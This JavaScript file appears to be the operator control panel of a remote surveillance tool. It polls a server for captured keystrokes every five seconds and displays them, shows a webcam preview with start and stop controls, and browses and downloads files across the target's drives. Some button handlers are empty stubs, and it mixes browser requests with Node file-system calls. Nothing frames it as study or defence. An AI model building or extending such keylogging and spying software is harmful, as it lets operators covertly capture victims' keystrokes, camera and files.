const video_element = document.getElementById("webcam_preview");
const keybox = document.getElementById('keybox');
const dirbox = document.getElementById('dirbox');
const file_selector = document.getElementById('file_selector');


const update_interval = 5000;

document.getElementById('refresh_file').addEventListener('click', function () {
    request('/action/get/folders')
});

document.getElementById('back_a_dir').addEventListener('click', function () {//go back a directory button
    console.log('back_a_dir clicked');

});
document.getElementById("stop_video").addEventListener('click', function () {//stop video feed button
    console.log('stop_video clicked');

});
document.getElementById("start_video").addEventListener('click', function () {//start video feed button
    console.log('start_video clicked');

});

window.addEventListener('load', function () {
    request('/action/get/folders')
    setInterval(() => {
        //request('/action/get/keylog').then(keylog =>{ writeoutkeylog(JSON.parse(keylog)) })
        request('/action/get/keylog')
        //request('/action/get/folders')
        //console.log('Keylog: ', request('/action/get/keylog')/*,' Folders: ',request('/action/get/folders')*/)
    }, update_interval);
})

async function request(what) {//make a request to server
    var xhttp = new XMLHttpRequest();

    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            var resput = JSON.parse(this.responseText)
            console.log('Sever responed with: ', resput)
            switch (what) {
                case '/action/get/keylog'://keylog
                    writeoutkeylog(resput)
                    break;
                case '/action/get/folders'://files and current dir
                    directoryman.files = resput.files;
                    directoryman.current_dir = resput.current_dir;
                    directoryman.files.forEach(filee => { directoryman.build_dir(resput.current_dir + '\\' + filee, filee) })
                    break;
            }
            //return this.responseText;

        }
    };

    //what must be a path
    xhttp.open("GET", what, true);
    xhttp.send();
}

function writeoutkeylog(keys) {//write keylog data to page
    console.log('write keylog: ', keys)
    keybox.innerText = "";

    keys.forEach(keycode => {
        var keyholder = document.createElement('div');
        keyholder.className = "keyholder"
        keyholder.innerText = keycode;
        keybox.appendChild(keyholder)
    });
}

let directoryman = {
    files: [],
    current_dir: [],
    search_root: async function () {//Search root drives, functionality stats here
        console.log('Search root');
        let letters = ['A:\\', 'B:\\', 'C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\', 'J:\\', 'K:\\', 'L:\\', 'M:\\', 'N:\\', 'O:\\', 'P:\\', 'Q:\\', 'R:\\', 'S:\\', 'T:\\', 'U:\\', 'V:\\', 'W:\\', 'X:\\', 'Y:\\', 'Z:\\'];
        document.getElementById('full_path').innerText = 'Drives';
        dirbox.innerHTML = "";
        directoryman.files = [];
        for (let i in letters) {
            if (fs.existsSync(letters[i])) {
                this.build_dir(letters[i], letters[i])
            }
        }
    },
    search_dir: async function (searchpath) {//searchpath must be a string
        this.current_dir.push(searchpath);//up the chain
        console.log('Search: ', searchpath);
        document.getElementById('full_path').innerText = searchpath;
        fs.readdir(searchpath, function (err, files) {
            if (err) {
                console.log(err)
                return 0;
            }
            dirbox.innerHTML = "";
            directoryman.files = files;
            console.log(files)
            files.forEach(filee => { directoryman.build_dir(searchpath + '\\' + filee, filee) })

        })
    },
    build_dir: function (fpath, name) {//represent a directory
        var directory = document.createElement('div');
        directory.className = "directory"
        var filename = document.createElement('div');
        filename.className = "filename"
        filename.innerText = name;
        var dir_icon = document.createElement('div');
        if (path.parse(fpath).ext == "") {//directory
            dir_icon.className = "dir_icon"
            directory.addEventListener('click', function () { directoryman.search_dir(fpath) })//search this directory
            directory.title = "search directory"
        } else {//file
            dir_icon.className = "file_icon"
            directory.title = "download file"
            directory.addEventListener('click', function () { })//download file
        }

        directory.appendChild(filename)
        directory.appendChild(dir_icon)
        dirbox.appendChild(directory)


    },
    go_back_a_dir: function () {
        console.log('Go back a dir')
        if (directoryman.current_dir.length < 2) {
            directoryman.current_dir = [];
            directoryman.search_root();
            return 0;
        } else {
            directoryman.current_dir.pop();
            var current = directoryman.current_dir.pop();
            console.log('back to: ', current)
            //document.getElementById('full_path').innerText = directoryman.current_dir[directoryman.current_dir.length]
            if (current == undefined) {
                directoryman.current_dir = [];
                directoryman.search_root();
            } else {
                directoryman.search_dir(current)
            }
        }
    }
}